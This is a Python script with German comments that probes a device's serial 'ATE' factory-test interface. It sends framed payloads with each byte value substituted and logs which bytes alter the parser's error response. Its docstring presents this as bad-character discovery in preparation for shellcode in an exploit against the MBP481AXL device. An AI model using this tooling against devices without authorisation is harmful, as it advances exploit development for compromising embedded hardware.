#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
badchar_finder.py - Findet "Bad Characters" für den MBP481AXL Exploit.

Methodik: Sendet einen festen Puffer aus 'A's und ersetzt sukzessive jedes
Byte (0x00-0xFF), um abweichende Reaktionen des Parsers zu identifizieren.
Das ist die Vorbereitung für einen sauberen Shellcode.

Nutzung:
  python3 badchar_finder.py /dev/ttyUSB0
"""

import sys
import time
import serial

# --- Konfiguration ---
if len(sys.argv) < 2:
    sys.exit("Port fehlt, Hazard. -> Usage: badchar_finder.py <serial_dev>")

DEV = sys.argv[1]
BAUD = 115200
TIMEOUT = 0.5
LOGFILE = "badchar_finder.log"
PAYLOAD_LEN = 32  # Eine Länge, die zuverlässig den 'CMD Error b' auslöst

# --- ATE-Protokoll ---
PREAMBLE = b"\x55\xAA"
OP_TRIGGER = 0x72
OP_TARGET = 0x0D

def wait_for_prompt(ser, prompt_bytes, timeout=10.0):
    """Wartet geduldig auf den ATE-Prompt."""
    print(f"[*] Warte auf Prompt '{prompt_bytes.decode(errors='ignore')}' (Timeout: {timeout}s)...")
    buffer = b''
    start_time = time.time()
    while time.time() - start_time < timeout:
        if ser.in_waiting:
            buffer += ser.read(ser.in_waiting)
            if prompt_bytes in buffer:
                print("[+] Prompt erkannt!")
                return True
        time.sleep(0.1)
    print(f"[!] Timeout! Prompt nicht gefunden. Letzte Daten: {buffer[-200:]!r}")
    return False

def get_base_error(ser):
    """Ermittelt die Standard-Fehlermeldung für einen ungültigen Payload."""
    print("[*] Ermittle die Standard-Fehlermeldung mit einem 'AAAA...' Payload.")
    payload = b'A' * PAYLOAD_LEN
    
    # Trigger senden
    ser.write(PREAMBLE + bytes([OP_TRIGGER, 0, 0]))
    time.sleep(0.1)
    ser.read(1024)
    
    # Target senden
    frame = PREAMBLE + bytes([OP_TARGET, len(payload) & 0xFF, (len(payload) >> 8) & 0xFF]) + payload
    ser.write(frame)
    time.sleep(0.2)
    response = ser.read(1024)
    
    if not response:
        sys.exit("[!] Keine Baseline-Antwort erhalten. Funktioniert der ATE-Modus?")
        
    print(f"[+] Standard-Fehler-Response: {response!r}")
    return response

def main():
    print(f"[*] Starte Bad Character Finder auf {DEV}")
    try:
        ser = serial.Serial(DEV, BAUD, timeout=TIMEOUT)
    except serial.SerialException as e:
        sys.exit(f"[!] Port-Fehler: {e}")

    with open(LOGFILE, "wb", buffering=0) as log:
        if not wait_for_prompt(ser, b"Please key 'y' or 'Y'"):
            sys.exit(1)

        print("[*] Wechsle in den ATE-Modus...")
        ser.write(b'y')
        time.sleep(0.5)
        ser.reset_input_buffer()
        log.write(b"[*] Entered ATE mode.\n")

        base_error_response = get_base_error(ser)
        bad_chars = []

        print("\n" + "="*50)
        print(f"[*] Starte Suche nach Bad Characters (0x00 - 0xFF) bei Payload-Länge {PAYLOAD_LEN}")
        print("="*50 + "\n")

        for byte_val in range(256):
            test_char = bytes([byte_val])
            # Erstelle Payload: AAAA...<BAD_CHAR>...AAAA
            payload = (b'A' * 16) + test_char + (b'A' * (PAYLOAD_LEN - 17))
            
            # Trigger
            ser.write(PREAMBLE + bytes([OP_TRIGGER, 0, 0]))
            time.sleep(0.1)
            ser.read(1024)
            
            # Target
            frame = PREAMBLE + bytes([OP_TARGET, len(payload) & 0xFF, (len(payload) >> 8) & 0xFF]) + payload
            ser.write(frame)
            time.sleep(0.2)
            response = ser.read(1024)

            log.write(f"> Testing byte 0x{byte_val:02x}\n".encode())
            log.write(f"< Response: {response!r}\n".encode())

            if response != base_error_response:
                print(f"[!] BAD CHARACTER GEFUNDEN: 0x{byte_val:02x}")
                print(f"    Antwort: {response!r}")
                bad_chars.append(byte_val)

        print("\n" + "="*50)
        print("[+] Suche abgeschlossen.")
        if bad_chars:
            hex_chars = [f"0x{c:02x}" for c in bad_chars]
            print(f"[*] Gefundene Bad Characters: {', '.join(hex_chars)}")
            log.write(f"\n\n[SUMMARY] Bad Characters found: {', '.join(hex_chars)}\n".encode())
        else:
            print("[*] Keine abweichenden Bad Characters gefunden.")
        print("="*50)
    
    ser.close()

if __name__ == "__main__":
    main()
